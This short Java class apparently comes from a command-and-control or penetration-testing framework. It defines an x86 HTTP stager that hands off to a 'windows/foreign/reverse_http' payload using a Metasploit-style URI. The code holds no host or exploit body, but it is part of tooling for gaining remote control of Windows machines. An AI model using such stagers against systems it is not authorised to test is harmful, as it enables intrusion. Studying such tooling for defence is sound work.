package stagers;

import common.CommonUtils;
import common.ScListener;

public class ForeignHTTPStagerX86 extends GenericHTTPStagerX86 {
    public ForeignHTTPStagerX86(ScListener scListener) {
        super(scListener);
    }

    public String payload() {
        return "windows/foreign/reverse_http";
    }

    public String getURI() {
        return CommonUtils.MSFURI(32);
    }
}
